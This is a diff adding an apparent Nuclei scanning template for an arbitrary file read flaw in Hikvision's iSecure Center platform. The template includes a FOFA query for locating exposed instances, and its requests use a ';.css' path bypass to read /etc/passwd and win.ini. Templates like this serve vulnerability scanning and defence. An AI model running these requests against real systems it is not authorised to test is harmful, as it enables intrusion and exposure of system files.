@@ -1,0 +1,31 @@
+id: hikvision-iSecure-Center-lm-api-file-fileread
+info:
+  name: 海康威视综合安防管理平台 /lm/api/file - fileread
+  author: leadlife
+  severity: high
+  description: 海康威视-综合安防管理平台 /lm/api/file 路径 link 参数存在任意文件读取漏洞
+  metadata:
+    verified: true
+    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
+  tags: hikvision,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/lm/api/files;.css?link=/etc/passwd"
+      - "{{BaseURL}}/lm/api/files;.css?link=c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
